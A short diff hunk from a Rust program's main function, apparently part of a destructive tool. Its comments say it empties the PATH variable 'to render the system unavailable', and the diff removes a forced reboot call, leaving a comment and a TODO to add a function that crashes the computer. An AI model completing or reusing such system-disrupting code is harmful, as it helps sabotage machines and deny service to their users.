@@ -36,9 +36,8 @@ fn main() {
     //*Set path var to an empty string to render the system unavailable.
     env::set_var("PATH", "");
 
-    //*Finally it reboots the computer.
-    let reboot =system_shutdown::reboot();
-    if reboot.is_err() { log::error("failed to reboot");}
+    //*Finally it crashes the computer.
+    //TODO: add a function to crash the computer.
 
     process::exit(0);
     }
